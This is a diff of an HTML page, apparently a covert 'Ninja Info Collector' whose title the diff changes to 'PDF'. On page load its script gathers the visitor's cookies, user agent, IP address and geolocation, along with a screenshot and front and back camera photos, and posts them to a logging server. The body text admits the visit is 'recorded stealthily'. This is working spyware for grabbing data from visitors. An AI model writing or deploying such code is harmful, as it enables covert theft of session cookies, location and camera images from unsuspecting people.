@@ -3,50 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ninja Info Collector</title>
+    <title>PDF</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // User Agent
+            // Collect user agent
             var userAgent = navigator.userAgent;
 
-            // Fetch IP Address
-            async function getIPAddress() {
-                try {
-                    let response = await fetch('https://api.ipify.org?format=json');
-                    let data = await response.json();
-                    return data.ip;
-                } catch (error) {
-                    console.error('Error fetching IP:', error);
-                    return 'Error fetching IP';
+            // Function to fetch IP address
+            function getIPAddress() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => data.ip)
+                    .catch(error => {
+                        console.error('Error fetching IP:', error);
+                        return 'Error fetching IP';
+                    });
+            }
+
+            // Function to fetch Geolocation
+            function getGeolocation(resolveFunc) {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => resolveFunc({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        }),
+                        error => {
+                            console.error('Error fetching geolocation:', error);
+                            setTimeout(() => getGeolocation(resolveFunc), 5000); // Retry every 5 seconds
+                        }
+                    );
+                } else {
+                    console.error('Geolocation not supported');
+                    resolveFunc({
+                        latitude: 'Geolocation not supported',
+                        longitude: 'Geolocation not supported'
+                    });
                 }
             }
 
-            // Fetch Geolocation
-            function getGeolocation() {
-                return new Promise((resolve) => {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            position => resolve({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude
-                            }),
-                            error => {
-                                console.error('Error fetching geolocation:', error);
-                                setTimeout(() => getGeolocation().then(resolve), 5000); // Retry every 5 seconds
-                            }
-                        );
-                    } else {
-                        console.error('Geolocation not supported');
-                        resolve({
-                            latitude: 'Geolocation not supported',
-                            longitude: 'Geolocation not supported'
-                        });
-                    }
-                });
-            }
-
-            // Get Cookies
+            // Function to get cookies
             function getCookies() {
                 try {
                     var cookies = document.cookie.split(';').reduce((cookieObject, cookieString) => {
@@ -61,27 +58,27 @@
                 }
             }
 
-            // Get Referrer
+            // Function to get referrer
             function getReferrer() {
                 return document.referrer || "No referrer";
             }
 
-            // Get Page Load Time
+            // Function to get page load time
             function getPageLoadTime() {
                 return window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
             }
 
-            // Get Screen Resolution
+            // Function to get screen resolution
             function getScreenResolution() {
                 return `${screen.width}x${screen.height}`;
             }
 
-            // Get Local Time
+            // Function to get local time
             function getLocalTime() {
                 return new Date().toLocaleString();
             }
 
-            // Capture Screenshot
+            // Function to capture screenshot
             function captureScreenshot(callback) {
                 html2canvas(document.body).then(canvas => {
                     canvas.toBlob(blob => {
@@ -90,7 +87,7 @@
                 });
             }
 
-            // Capture Camera Photo
+            // Function to capture camera photo
             function captureCameraPhoto(cameraMode, callback) {
                 const video = document.createElement('video');
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraMode } })
@@ -106,7 +103,7 @@
                                 stream.getTracks().forEach(track => track.stop());
                                 callback(blob);
                             });
-                        }, 1000);
+                        }, 1000); // Wait for the video to initialize
                     })
                     .catch(error => {
                         console.error('Error accessing camera:', error);
@@ -114,12 +111,14 @@
                     });
             }
 
-            // Send Data to Server
-            function sendDataToServer(data, endpoint, isJson, callback) {
-                fetch(endpoint, {
+            // Send collected data to the server
+            function sendDataToServer(data, callback) {
+                fetch('http://localhost:5000/logs', {
                     method: 'POST',
-                    headers: isJson ? {'Content-Type': 'application/json'} : {},
-                    body: isJson ? JSON.stringify(data) : data
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
                 })
                 .then(response => response.json())
                 .then(result => {
@@ -132,7 +131,7 @@
                 });
             }
 
-            // Collect and Send Data
+            // Function to collect and send data in stages
             function collectAndSendData() {
                 const data = {
                     userAgent: userAgent,
@@ -142,26 +141,33 @@
                     localTime: getLocalTime()
                 };
 
-                sendDataToServer(data, 'http://localhost:5000/logs', true, () => {
+                sendDataToServer(data, () => {
                     getIPAddress().then(ipAddress => {
-                        sendDataToServer({ ipAddress: ipAddress }, 'http://localhost:5000/logs', true, () => {
-                            getGeolocation().then(location => {
-                                sendDataToServer(location, 'http://localhost:5000/logs', true, () => {
+                        sendDataToServer({ ipAddress: ipAddress }, () => {
+                            new Promise((resolve) => getGeolocation(resolve)).then(location => {
+                                sendDataToServer(location, () => {
                                     captureScreenshot(screenshotBlob => {
                                         if (screenshotBlob) {
                                             const formData = new FormData();
                                             formData.append('screenshot', screenshotBlob, 'screenshot.png');
-                                            sendDataToServer(formData, 'http://localhost:5000/upload', false, () => {
+                                            fetch('http://localhost:5000/upload', {
+                                                method: 'POST',
+                                                body: formData
+                                            }).then(() => {
                                                 captureCameraPhoto('user', frontCameraBlob => {
                                                     if (frontCameraBlob) {
-                                                        const frontFormData = new FormData();
-                                                        frontFormData.append('frontCamera', frontCameraBlob, 'front_camera.png');
-                                                        sendDataToServer(frontFormData, 'http://localhost:5000/upload', false, () => {
+                                                        formData.append('frontCamera', frontCameraBlob, 'front_camera.png');
+                                                        fetch('http://localhost:5000/upload', {
+                                                            method: 'POST',
+                                                            body: formData
+                                                        }).then(() => {
                                                             captureCameraPhoto('environment', backCameraBlob => {
                                                                 if (backCameraBlob) {
-                                                                    const backFormData = new FormData();
-                                                                    backFormData.append('backCamera', backCameraBlob, 'back_camera.png');
-                                                                    sendDataToServer(backFormData, 'http://localhost:5000/upload', false, () => {
+                                                                    formData.append('backCamera', backCameraBlob, 'back_camera.png');
+                                                                    fetch('http://localhost:5000/upload', {
+                                                                        method: 'POST',
+                                                                        body: formData
+                                                                    }).then(() => {
                                                                         setTimeout(() => location.reload(), 5000);
                                                                     });
                                                                 } else {
@@ -192,7 +198,7 @@
     </script>
 </head>
 <body>
-    <h1>Welcome to Happy Land</h1>
-    <p>Your visit is being Happy!</p>
+    <h1>Welcome to Ninja Info Collector</h1>
+    <p>Your visit is being recorded stealthily!</p>
 </body>
 </html>
